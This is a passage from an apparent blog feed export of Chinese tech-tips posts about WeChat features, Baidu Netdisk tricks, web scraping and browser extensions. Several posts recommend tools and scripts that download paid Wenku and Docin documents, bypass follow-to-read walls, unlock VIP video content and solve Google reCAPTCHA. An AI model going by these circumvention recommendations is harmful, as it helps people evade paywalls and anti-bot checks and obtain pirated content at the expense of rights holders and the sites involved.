，网页标题，访问次数。还有可视化功能，看看你访问的top10网站是哪些。还可以导出txt文件，文件内容是逗号分隔，用Excel看会方便点，不过由于中文乱码的原因需要转换下，我这里用Python处理下。12history=pd.read_table('2020-12-03_2020-12-10.txt',',')history.to_csv('history.csv',encoding="utf_8_sig") 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 百度网盘分享链接秒挂？试试这个神器 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 2020 最全电子书搜索网站，找电子书不再愁 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 集赞生成器：朋友圈集赞不求人 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[鲜为人知的几个微信实用技巧]]></title>
    <url>%2F2020%2F12%2F11%2F%E9%B2%9C%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E5%87%A0%E4%B8%AA%E5%BE%AE%E4%BF%A1%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第 200 篇原创文章，将本公众号设为星标，第一时间看最新文章。 昨天文章 一键备份导出虾米音乐数据，包含收藏专辑/音乐/艺人/歌单 的红包抽奖还没结束，没抽的可以试试。 关于微信之前写过很多文章了，最近微信7.0.21上线了，又增加了些实用的功能，这里再做个整理。 如何导出你的微信语音 c 盘空间又满了？微信清理神器帮你释放空间 微信撤回的消息也能看到！ 如何备份可能被删的公众号文章和网页 如何在电脑上登陆多个微信 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 一键生成你的微信社交数据报告 如何发一条九宫格图片的朋友圈 提现免手续费是不一直抱怨微信提现手续费太高？教你薅下微信羊毛，在微信支付公众号点击支付有优惠进入小程序。 平常微信支付后会得金币，然后提现的时候通过金币兑换免费券，1金币=100额度， 每周兑换一次 https://www.bilibili.com/video/BV1Na411F7fX 彩色昵称最近发现不少微信好友昵称是彩色的，使用 https://www.xsbbs.org/tool/blue/?v=5这个网站就能生成（仅限字母，文末点击阅读原文进入）。 查询名下账户在公众号 腾讯客服 输入名下账户 可以查询你的身份证下绑定了多少微信或者注销名下其他账户，输入微信支付银行卡扣费查询 查清楚微信支付银行卡扣费明细。 下载支付账单账单记录不小心删除了没关系，可以在账单里的常见问题里下载账单。很快邮件就收到微信发的账单Excel文件。 搜索相关表情表情包不够用?长按表情即可搜索相关表情。 关闭腾讯广告文末点击原文链接打开 http://ads.privacy.qq.com/ads/optout.html 登录微信点击关闭按钮 （为期六个月），不过关闭后仍然会看到广告，但相关性会降低。 6个新表情微信上线的6个新表情前几天还上了微博热搜。据说让我看看表情来自苏有朋在《还珠格格》的五阿哥https://weibo.com/1892464897/JuwMJ0ZrM 手机号转账支付管理里开启允许通过手机号给我转账，好友即可直接给你的手机号转账到你的微信。 不发送原图不要发送微信原图（默认不会勾选原图），可能会泄露你的地理位置信息，这个之前文章 如何清除手机拍照的图片 exif 防止泄露你的隐私 已经介绍过了。 扫一扫识物平常用得最多的是扫一扫识别二维码，其实扫一扫还可以识别实物（商品条码、图书封面、CD封面等），比如这个遥控器，能给出对应京东商品，方便直接购买。还有扫一扫翻译，可以扫描英文单词来翻译成中文。 发送200MB大文件和高清视频图片在对话框 文件 中可以发送200MB大文件和高清视频图片，还能在聊天中的文件看到接收和发出过的所有文件，目前 iOS 已上线该功能，安卓版还要等等。 聊天加话题标签在微信聊天框输入#+关键词，发送后即可生成可点击的话题标签，类似微博话题。 比如输入#周杰伦 点击后会显示周杰伦的信息。 还可以#北京天气 ，#火车票 等，另外还有3个标签可以快捷的在聊天中分享公众号，小程序和视频号，朋友圈也适用。123#小程序：小程序名称#公众号：公众号名称#视频号：视频号名称 验证是否被好友删了直接给好友转账任意金额，如果是非好友直接提示你不是收款方好友，对方添加你为好友后才能发起转账，不过这个只能单个测试，拉群也只能限制40人。 城市服务打开我–&gt;支付 –&gt;城市服务里有社保公积金、看病挂号、交通出行、城市热力图等服务，帮你快速找到实用便利的生活指南。 再分享几个微信出的小程序。 微信小程序经常在群里看到各种谣言？用微信辟谣助手小程序一键查询真伪。还有微信使用小助手，教会爸妈更快的学会使用微信，有视频教程和图文教程。腾讯QQ 小程序绑定QQ账号后可以在微信里接收和查看QQ消息，以及微信转账到QQ 小程序 可以直接给QQ账号转账。 是不想找一款记账软件管理自己的收益和支出，小程序微信记账本能自动同步微信账单，不用你手动记，还有数据分析功能。还会给你发记账日报通知你。 最后分享一条来自微博的微信冷知识，原来声称被清理的文件实际上还都在手机里 https://weibo.com/6493078812/JwNndcPnG 还有哪些微信实用技巧，欢迎在文章末尾留言。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百度网盘分享链接秒挂？试试这个神器（另外分享一款百度网盘下载工具）]]></title>
    <url>%2F2020%2F12%2F11%2F%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%88%86%E4%BA%AB%E9%93%BE%E6%8E%A5%E7%A7%92%E6%8C%82%EF%BC%9F%E8%AF%95%E8%AF%95%E8%BF%99%E4%B8%AA%E7%A5%9E%E5%99%A8%EF%BC%88%E5%8F%A6%E5%A4%96%E5%88%86%E4%BA%AB%E4%B8%80%E6%AC%BE%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第199 篇原创文章，将本公众号设为星标，第一时间看最新文章。 文章开始前说下之前文章 2020年10月最新免费加速下载百度网盘文件方法 介绍的油猴脚本网盘助手又可以下载百度网盘文件了。 不过它的自动获取提取码功能失效了，可以用网盘精灵 （支持百度云盘、新浪微盘、蓝奏云盘、腾讯微盘的提取码获取）https://chrome.google.com/webstore/detail/%E7%BD%91%E7%9B%98%E7%B2%BE%E7%81%B5/llckjenneniijhiehfmbmlgdekeakbmf/related?hl=zh-CN 这个Chrome插件代替下。 网盘精灵支持百度云盘、新浪微盘、蓝奏云盘、腾讯微盘的提取码获取，自动填充，为你提供便捷的资源搜索服务。https://pan.baidu.com/share/init?surl=dRwtlkyA6VXzbVE5FYEqCQ#list/path=%2F 提供便捷的搜索服务； 云秘钥，自动获取提取码，并填充； 百度云盘去广告，去掉百度云盘的广告，还你一个清爽的界面； 多个网盘的支持，支持百度云盘、新浪微盘、腾讯微盘、蓝奏云； 不过测试下来效果不及网盘助手，毕竟用户量还小。 有时候刚分享的百度网盘链接就挂了，比如这个 https://pan.baidu.com/s/1d149VWMn_UcZ8dMF06XxYg https://pan.baidu.com/s/1Z8qQszIhWbQdpjOv0d7PJA ，下面分享下怎么解决它。 秒传链接提取油猴脚本所谓秒传链接就是可以转存他人用提取码分享的文件，也可以自己生成提取码分享敏感文件。 原理就是只要有人上传过文件到百度网盘，它的特征码就被记录在百度的服务器上，即使网盘删除了该文件，可以利用生成的秒传链接把文件转存到自己网盘上。 下面具体操作下，打开软件标准提取码生成器 https://wwx.lanzoux.com/iZu8Fizo10d https://github.com/JixunMoe/mfcDuDownloadCodeGenerator 或者命令行工具https://github.com/winterssy/bdpass/releases 生成文件的秒传链接（如果下载慢后台回复 网盘 获取）。 比如上传之前文章良心整理：PDF工具合集 分享的PDF工具 ,生成秒传链接5636E76E47676141EC5449E715B7B553#8DD9EE2CDCE070EDBA18190EF6B712EE#6426135#PDFShaper中文版.zip 安装好这个油猴脚本https://greasyfork.org/zh-CN/scripts/397324 （关于安装油猴脚本和使用见之前文章实用油猴脚本推荐，让你的谷歌浏览器更强大），用于提取和生成百度网盘秒传链接，支持梦姬（就是本文分享这种格式）、游侠、pandownload、baidupcs-go的秒传链接提取，支持批量转存。 打开百度网盘首页，点击秒传链接，输入上面生成的提取码。 转存成功。在你的网盘里就可以看到这个文件了，之后你分享5636E76E47676141EC5449E715B7B553#8DD9EE2CDCE070EDBA18190EF6B712EE#6426135#PDFShaper中文版.zip 这个提取码出去就行了。 不过上面的操作还是有点麻烦，还可以试试百度网盘新出的收集文件功能 https://pan.baidu.com/disk/main#/transfer/list ，可以自己建分享链接，让好友把文件上传进去，不用担心网盘分享链接失效了，链接有效期最多30天。 点击生成一个分享链接地址 。打开这个地址就能上传文件进去了。在我的收集里就有了，以后求敏感资源就生成一个分享链接，让对方把文件传到你的网盘。 在线网站除了安装油猴脚本还可以使用在线网站生成秒传链接 https://rapid.acg.uy/gen.html ，比如上传文件6d406ad3a29d8d8a0cffdee7f664576f#2c4b4dedbb3092790334ac372ae07970#36942522#bilibili自动升级账号工具-tool-v1.0.10-win-x86-x64.zip再输入根据https://pan.baidu.com/api/gettemplatevariable?fields=[%22bdstoken%22] 这个接口获取 的bdstoken。 点击解析链接并转存。百度网盘里就有了这个文件了。 接着分享个加速下载网盘工具impan 。 impan这是个基于 aria2 https://github.com/mayswind/ariang 的下载工具（公众号后台回复 网盘 获取），下载软件后先修改配置文件 pan.conf 里的 cookie 设置。123[pan.baidu.com]STOKEN=zzzzBDUSS=xxx STOKEN 和BDUSS 可以在控制台storage获取到。 打开软件会监听 6800 端口，同时登陆你的百度网盘账号 。右侧选择你的网盘文件下载。下载速度比百度网盘的100k/s还是快不少的。话说最近新版《鹿鼎记》遭到全网吐槽，还是重温下陈小春版的鹿鼎记吧（如果想看后台回复 电视剧 获取）。 最后提下百度网盘在内测的 在线文档（有点类似石墨文档和腾讯文档） https://pan.baidu.com/disk/main#/wpguide在首页新建在线文档。可以方便的编辑文档和插入网盘内的文件。效果如图。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 2020 年 11 月福利，小伙伴们来领现金红包 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 2020 最全电子书搜索网站，找电子书不再愁 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 集赞生成器：朋友圈集赞不求人 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 年 11 月福利，小伙伴们来领现金红包]]></title>
    <url>%2F2020%2F12%2F11%2F2020-%E5%B9%B4-11-%E6%9C%88%E7%A6%8F%E5%88%A9%EF%BC%8C%E5%B0%8F%E4%BC%99%E4%BC%B4%E4%BB%AC%E6%9D%A5%E9%A2%86%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%2F</url>
    <content type="text"><![CDATA[11月过去了，又到了发福利的时候了，之前发过的福利见文章： 2020年10月福利，小伙伴们来领现金红包 中秋/国庆节发福利了，小伙伴们来领现金红包 8月发福利了，小伙伴们来领现金红包 首先是11月份在公众号文章末尾评论天数前25的小伙伴（评论仅限文章发布当天 ）。 babe， 箴逸～， 为欢几合， 卖火柴的小女孩， 混沌， 叱吒風雲，Schimidt，逗比青年，奋勇一博，🇧 🇴 🇱 🇩，Coexistence，You can!，雷厉 ，啊，超，琼悦， 小时光，百子莲，天空之城，懒懒懒懒懒懒猪，雪凝，温馨提示，EEZGS，Yaya，小苏苏，南風。 昵称 红包 babe 100 箴逸～ 50 为欢几合 50 卖火柴的小女孩 50 混沌 50 叱吒風雲 18 Schimidt 18 逗比青年 18 奋勇一博 18 🇧 🇴 🇱 🇩 18 Coexistence 18 You can! 18 雷厉 18 啊，超 18 琼悦 18 小时光 8 百子莲 8 天空之城 8 懒懒懒懒懒懒猪 8 雪凝 8 温馨提示 8 Yaya 8 EEZGS 8 小苏苏 8 南風 8 以上小伙伴没加我微信的加下我，加过的给我发条微信提醒下。 话说11月评论的人数有150人左右，有些人微信昵称有各种emoji表情，还有些空白昵称，这次手动统计就耗费我好几个小时，真的累，下次看看怎么用代码来统计，如果还是麻烦就换个形式。 11月份发的红包记录如图2020年10月福利，小伙伴们来领现金红包 除了上面25位小伙伴获得的共560元微信红包，另外发个抽奖，公众号后台回复 中奖 进入小程序抽奖，抽1人66块（当请吃午饭了），12月3号20点开奖（会有微信通知开奖），中奖后可直接提现到微信钱包。 除了获得红包，我觉得更重要的是大家觉得我写的文章对你有用，比如前几天加我微信的小伙伴。 目前公众号已发布198篇原创（大家顺便星标下公众号）。 大家有兴趣可以在公众号菜单栏中点击历史文章进入文章列表查看。 公众号每周更新2-3篇原创文章，一般是早上8点20发，没有标题党，但愿没有浪费你时间，还能对你有所帮助。 话说每周写2-3篇原创还是挺有压力的，毕竟平时还要上班，文章也不能随意拼凑（或者转发别人的文章），都是一字一句测试核对发出来，经常写到凌晨1点。 最后说下，由于现在公众号信息流乱序了，已经不按时间倒序来展示你关注的公众号更新，如果不想错过我的文章，麻烦将本公众号设置为星标，这样就不用在你关注的那么多公众号里翻了 。 传闻虾米音乐明年要关闭，一键导出收藏专辑、音乐、艺人、歌单 文章开始前发个抽奖，前几天文章 2020 年 11 月福利，小伙伴们来领现金红包 的66元红包被这位小伙伴抽中了。这是他在后台回复的，关注苏生不惑有段时间了。这位小伙伴11月1号开始关注的。今天再发个66的抽奖，公众号后台回复 中奖 进入小程序抽奖，抽1人66块，12月9号20点开奖（会有微信通知开奖），中奖后可直接提现到微信钱包。 最近传闻虾米音乐明年要关闭，话题#虾米音乐关闭#一度登上微博热搜。 之前文章 歌单助手：一键导出网易云音乐歌单列表，推荐你喜爱的专辑 介绍的导出工具没提到虾米，今天就再次分享下。 打开网站 https://music.wechatsync.com/explore ，先安装Chrome插件，手动安装Chrome插件教程见之前文章 上不了谷歌如何安装 Chrome 扩展？ 安装以后登录你的虾米账号，选择要导出的东西（比如收藏歌曲，收藏专辑，关注艺人，原创歌单，收藏歌单，贡献专辑，艺人资料和专辑资料）。点击开始导出，等待一会。导出成功后下载导出Excel文件到本地即可。 作者说导出虾米音乐再导入到网易云音乐在开发中，如果还想从网易云音乐、QQ音乐、虾米音乐、百度音乐歌单导入到Spotify中可以使用 https://spot.uselesses.com 之前文章 2020年10月最新免费加速下载百度网盘文件方法 介绍的油猴脚本网盘助手有小伙伴问怎么没有生成链接选项，这个需要先安装油猴Chrome扩展（公众号后台回复 油猴 获取）再安装网盘助手脚本，选择网盘文件才有生成链接按钮。 还有之前文章 如何免登陆观看b站大会员番剧 分享的那个脚本失效了，不过现在又有了新的脚本 https://greasyfork.org/zh-CN/scripts/407847 ，哔哩哔哩番剧解锁大会员,集合了优酷、爱奇艺、腾讯等全网VIP视频免费破解去广告。https://xbeibeix.com/api/bilibili/biliplayer/?url=BV1ip4y1D7iY 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 百度网盘分享链接秒挂？试试这个神器 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 良心整理：PDF工具合集 2020 最全电子书搜索网站，找电子书不再愁 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 集赞生成器：朋友圈集赞不求人 百度网盘下载太慢？不限速的阿里云盘来了 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件]]></title>
    <url>%2F2020%2F11%2F27%2F%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E7%99%BE%E5%BA%A6%E6%96%87%E5%BA%93-%E8%B1%86%E4%B8%81-%E9%81%93%E5%AE%A2%E5%B7%B4%E5%B7%B4%E6%96%87%E6%A1%A3%EF%BC%8C%E6%94%AF%E6%8C%81%E5%AF%BC%E5%87%BAPDF%EF%BC%8CWord%EF%BC%8Ctxt-%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[苏生不惑第198 篇原创文章，将本公众号设为星标，第一时间看最新文章。 先说个题外话，昨天文章 解除网页查看限制，自由查看和跳转网站 评论下有小伙伴问是否有插件可以直接打开新标签页，一般我用右键在新标签页打开链接，不过这样有点麻烦。 其实自己写个油猴脚本就可以了。脚本内容如下，其实就一行代码，开启这个脚本后所有链接都会在新标签页打开。1234567891011121314// ==UserScript==// @name 新标签打开网页// @namespace http://tampermonkey.net/// @version 0.1// @description 新标签打开网页// @author 苏生不惑// @match *://*/*// @grant none// ==/UserScript==(function() &#123; 'use strict'; document.querySelectorAll("a").forEach(function(item,index,arr)&#123;item.target='_blank';&#125;);&#125;)(); 另外文章里分享了安装Chrome扩展即可复制百度文库上的文字，后台有小伙伴问能不能下载百度文库，于是这里再做个整理。 小叶文档下载器这个软件（公众号后台回复文库获取该软件）支持百度文库/豆丁/道客/新浪爱问/淘豆/帮帮文库/蚂蚁文库等文档的下载， 支持PDF和Word格式输出，同时支持OCR文字识别 （如果需要提取文字）https://pan.lanzoux.com/iqihJiagvhc 输入百度文库地址 https://wenku.baidu.com/view/021014797dd184254b35eefdc8d376eeaeaa172f.html ，下载的文件在当前自录下的download目录。 打开下载的PDF没问题。再来下载豆丁文档 https://www.docin.com/p-513589737.html ，这个是Word格式。还有道客巴巴文档 https://www.doc88.com/p-9029134991389.html 冰点文库这个软件运行很久了（公众号后台回复文库获取该软件），无需积分就可以自由下载百度/豆丁/丁香/MBALib/Book118等文库文档（付费文档也支持）。 会同时下载 PDF和txt格式文件。豆丁文档也一样（其他网站就不一一测试了）。 如果你使用的Mac系统，上面的Windows软件就没法用了，推荐下面的Chrome扩展和油猴脚本。 Chrome扩展比如这个百度文库https://wenku.baidu.com/view/021014797dd184254b35eefdc8d376eeaeaa172f.html 剩余3页不能看。安装 https://github.com/wxbool/baidu-wenku 这个Chrome扩展后右侧多了清理dom和导出文档按钮。点击清理dom会自动运行。清理完成后页面上只剩下文档。点击导出文档会调用谷歌浏览器的另存为PDF，保存即可。 如果想将下载后的 PDF 文档转换为 Word 文档格式推荐之前文章 良心整理：PDF工具合集 分享的软件 pdfsharper 提取文本也很方便。 油猴脚本https://greasyfork.org/zh-CN/scripts/405373 这个脚本会将百度文库内文章中的文本内容转换为 word 并下载，关于油猴脚本的安装使用见之前文章 实用油猴脚本推荐，让你的谷歌浏览器更强大 下载的Word文件没问题。 最后分享个下载豆丁文档的网站 https://www.docin365.com/ ， 这个网站是豆丁网文档复制抓取工具，导出的文档为word形式，非源文件，但文字可编辑，包含图片，尽量保持原文档的格式。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 良心整理：PDF工具合集 2020 最全电子书搜索网站，找电子书不再愁 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 集赞生成器：朋友圈集赞不求人 百度网盘下载太慢？不限速的阿里云盘来了 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解除网页查看限制，自由查看和跳转网站]]></title>
    <url>%2F2020%2F11%2F27%2F%E8%A7%A3%E9%99%A4%E7%BD%91%E9%A1%B5%E6%9F%A5%E7%9C%8B%E9%99%90%E5%88%B6%EF%BC%8C%E8%87%AA%E7%94%B1%E6%9F%A5%E7%9C%8B%E5%92%8C%E8%B7%B3%E8%BD%AC%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[苏生不惑第197 篇原创文章，将本公众号设为星标，第一时间看最新文章。 最近发现某些网站查看全文要登录并关注博主，要关注公众号发送验证码解锁，最麻烦的还有谷歌的验证码了，这里就分享几个Chrome插件和油猴脚本搞定它们。 xtracexTrace 是一款Chrome扩展插件 https://github.com/StevenX911/xTrace ，用于屏蔽某些追踪用户行为的脚本，以及支持用户自定义屏蔽影响我们流畅阅读博文的前端脚本，Chrome扩展地址https://chrome.google.com/webstore/detail/xtrace/gnoegjcomgnaofcdeckopfoajfbboplb， 如果上不了谷歌安装参考之前文章 上不了谷歌如何安装 Chrome 扩展？ 。 进入谷歌浏览器扩展程序管理界面，开启开发者模式，点击加载已解压的扩展程序，选择解压出来的目录就安装好了。 比如csdn文章发布为粉丝可见就需要关注博主才能阅读全文。https://blog.csdn.net/qq_43762191/article/details/109195441安装xTrace扩展程序后，直接阅读全文，也不用登录了。 某些博客需要关注公众号发送验证码才能查看全文，这个扩展也能自动打开全文。 原理就是使用匿名的验证码生成接口 https://my.openwrite.cn/code/generate?blogId=15287-1573137991892-156，其中 blogId 参数可以在网页源代码中找到。 xTrace还可以用来屏蔽指定广告链接，它内置了如下拦截规则：1234567://hm.baidu.com/://www.google-analytics.com/://www.googletagmanager.com/://my.openwrite.cn/://pagead2.googlesyndication.com/://adservice.google.com://csdnimg.cn/release/blogv2/dist/pc/js/detail 也可以自己增加拦截的域名。 如果想拦截腾讯优酷爱奇艺视频的广告可以安装之前文章 如何更优雅地看电影/刷剧 推荐的广告终结者Chrome扩展。 无限制访问网盘资源之前分享过的文章 2020 最全百度网盘搜索，找电影资源不再愁 里面推荐的某些网站需要关注公众号解锁资源， 可以安装油猴脚本接触限制 https://greasyfork.org/zh-CN/scripts/412173 ，自动绕过限制直接跳转百度网盘，包括大力盘/罗马盘/大圣盘/小白盘/猪猪盘/小昭来了/小可搜搜等网站。 比如大力盘搜索 武林外传 。 安装脚本后就能直接查看资源了。 外链自由跳转现在微博，知乎，简书的非白名单外链是不能自由跳转的，比如https://link.zhihu.com/?target=https%3A//weibo.zhaoyizhe.com/这个插件可以帮你自动跳转https://chrome.google.com/webstore/detail/%E8%87%AA%E7%94%B1%E8%B7%B3%E8%BD%AC/ldfofldbjpkkenoichgpoikbfgplgfdd微博也一样。 当然也可以使用这个油猴脚本 https://greasyfork.org/zh-CN/scripts/412612-open-the-f-king-url-right-now，它支持微博/豆瓣/知乎/简书的外链自动跳转，微信公众号网页版 URL 点击跳转。关于油猴脚本安装使用见之前文章实用油猴脚本推荐，让你的谷歌浏览器更强大 自动跳过谷歌验证码每次遇到下面这样的谷歌验证码心里就一紧，因为不知道多少次才能通过。现在可以借助Chrome扩展 Buster https://chrome.google.com/webstore/detail/buster-captcha-solver-for/mpbjkejclgfgadiemmefgebjfooflfhl/related 帮你验证，原理是调用谷歌的语音识别破解谷歌的recaptcha验证 https://www.google.com/recaptcha/about/ 解除禁止复制百度文库上的文字需要开通VIP才能复制。 安装 simple allow copy 这个扩展 https://chrome.google.com/webstore/detail/simple-allow-copy/aefehdhdciieocakfobpaaolhipkcpgc 就能解除限制，之前文章已经分享过了 如何搞定某些网站不让复制文字 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 良心整理：PDF工具合集 2020 最全电子书搜索网站，找电子书不再愁 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 集赞生成器：朋友圈集赞不求人 百度网盘下载太慢？不限速的阿里云盘来了 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百度网盘下载太慢？不限速的阿里云盘来了]]></title>
    <url>%2F2020%2F11%2F27%2F%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD%E5%A4%AA%E6%85%A2%EF%BC%9F%E4%B8%8D%E9%99%90%E9%80%9F%E7%9A%84%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98%E6%9D%A5%E4%BA%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第196 篇原创文章，将本公众号设为星标，第一时间看最新文章。 说起百度网盘，最令人诟病的莫过于网盘限速，几k的下载速度让人抓狂，无奈的是我们还不得不用它，因为目前大家分享文件最多的还是用百度网盘链接，大家都在用，你就不得不用。 上个月在文章2020年10月最新免费加速下载百度网盘文件方法 分享的高速下载油猴脚本现在也挂了，如今只剩下自定义提取码功能了（后续如有更新我在文章里说下）。 不过最近百度网盘网页版上线了个收集文件功能 https://pan.baidu.com/disk/main#/transfer/list ，可以自己建分享链接，让好友把文件上传进去，不用担心网盘分享链接失效了，链接有效期最多30天。 生成一个分享链接地址 。打开这个地址就能上传文件进去了。在我的收集里就有了，以后求资源就生成一个分享链接，让对方把文件传到你的网盘。 之前提及过的阿里云盘 https://aliyundrive.com/ 现在开放内测了，输入邀请码即可注册，我体验了下，下载速度还不错。 目前可用的邀请码有：3JNU3J ，COOLPY，YUNPAN，ADRIVE，86CK0X ，TU0YDH，BQBNQU，KJRPUR，WXC4YQ ，如果邀请次数超限了改天再试。 目前有安卓，ios，和网页版。注册（需要下载APP注册）后默认空间有1.05T，不知道后续是否会升级。 网页版上传速度4MB/s 。上传的电影转码后就能在线播放（支持倍速播放）。 下载也不用安装什么油猴脚本可以直接调用idm下载。下载速度6MB/s还是很快的。300MB的电影很快就下载完了。APP端的下载速度4MB/s 。不过目前分享功能还没上线，期待下。 最后分享个网站https://xbeibeix.com/api/189 https://tmp.feilongproject.com/189cloud.html （公众号后台回复 网盘 获取），不用登录天翼云盘即可不限速下载文件。 最近文章： 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 良心整理：PDF工具合集 2020 最全电子书搜索网站，找电子书不再愁 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 集赞生成器：朋友圈集赞不求人 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影]]></title>
    <url>%2F2020%2F11%2F20%2F%E4%B8%8D%E7%94%A8%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%8CChrome-%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8-web-scraper-%E6%8A%93%E5%8F%96%E7%9F%A5%E4%B9%8E%E7%83%AD%E6%A6%9C-%E8%AF%9D%E9%A2%98-%E5%9B%9E%E7%AD%94-%E4%B8%93%E6%A0%8F%EF%BC%8C%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%2F</url>
    <content type="text"><![CDATA[苏生不惑第195 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过不会 Python 没关系，手把手教你用 web scraper 抓取豆瓣电影 top 250 和 b 站排行榜 ，后来我又玩了下，这个插件还是挺有意思的，所以通过抓取知乎和豆瓣再总结分享下。 知乎热榜知乎热榜地址 https://www.zhihu.com/hot （其实知乎还有个单独的热榜页面https://www.zhihu.com/billboard ），这里新增一个type Element attribute ，因为之前抓取豆瓣链接用的 link，它把文字也抓取了，而我们只要里面的href属性。 同样的先创建一个element的容器。 里面加4个选择器：知乎排名 ，知乎标题， 知乎链接 ，知乎热度 。预览下数据没问题。开始抓取数据并导出CSV文件。不过生成的CSV文件排序乱了 。在排序和筛选里按照排名重新排下就好了（如果需要更复杂的排序可以借助Python的pandas），看最后的结果。不过有个问题，热榜里的广告 https://www.zhihu.com/xen/market/ecom-page/1305179157022478336 没有热度，所以结果为null。为了方便大家学习抓取，我导出了sitemap，你可以直接导入使用。1&#123;"_id":"zhihu_hot","startUrl":["https://www.zhihu.com/hot"],"selectors":[&#123;"id":"知乎排名","type":"SelectorText","parentSelectors":["内容容器"],"selector":"div.HotItem-rank","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"知乎标题","type":"SelectorText","parentSelectors":["内容容器"],"selector":"h2","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"知乎链接","type":"SelectorElementAttribute","parentSelectors":["内容容器"],"selector":".HotItem-content a","multiple":false,"extractAttribute":"href","delay":0&#125;,&#123;"id":"知乎热度","type":"SelectorText","parentSelectors":["内容容器"],"selector":"div.HotItem-metrics","multiple":false,"regex":"","delay":0&#125;,&#123;"id":"内容容器","type":"SelectorElement","parentSelectors":["_root"],"selector":"section","multiple":true,"delay":0&#125;]&#125; 知乎回答这里以知乎日报的回答为例https://www.zhihu.com/org/zhi-hu-ri-bao-51-41/answers需要注意知乎的回答需要点击阅读全文才能完全展示。所以这里又增加个type element click里面有4个选择器：问题标题，赞同数，阅读全文，回答内容，回答链接。看下抓取结果没问题。 为了方便大家学习抓取，我导出了sitemap，你可以直接导入使用。1&#123;"_id":"zhihu_answer","startUrl":["https://www.zhihu.com/people/san-sheng-ruo-meng/answers"],"selectors":[&#123;"id":"回答容器","type":"SelectorElement","parentSelectors":["_root"],"selector":"div.List-item","multiple":true,"delay":0&#125;,&#123;"id":"问题标题","type":"SelectorText","parentSelectors":["回答容器"],"selector":"[itemprop='zhihu:question'] 